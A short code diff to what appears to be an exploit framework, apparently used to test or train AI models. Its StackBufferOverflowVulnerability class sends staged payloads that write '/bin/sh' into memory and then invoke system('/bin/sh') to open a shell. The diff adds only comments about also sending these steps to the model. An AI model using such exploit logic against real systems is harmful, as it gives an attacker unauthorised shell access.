@@ -197,6 +197,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         
         logger.info("Sending second payload (setup write to controlled memory)")
         sconn.sendline(payload2)
+        # TODO: We need to also send this to the model.
         logger.info("Navigating to return.")
         if self.suffix:
             logger.info(f"Attempting to receive provided suffix: {suffix}")
@@ -210,6 +211,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # write /bin/sh to a controlled part of memory
         logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
         sconn.sendline("/bin/sh\x00")
+        # TODO: We need to also send this to the model.
 
         # need to navigate back to the targetFunc
         if self.initial:
@@ -230,6 +232,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         logger.info("Sending final payload (invoke system('bin/sh'))")
         sconn.sendline(payload3)
+        # TODO: We need to also send this to the model.
         
         # Payload sent, now exit the function.
         if self.suffix:
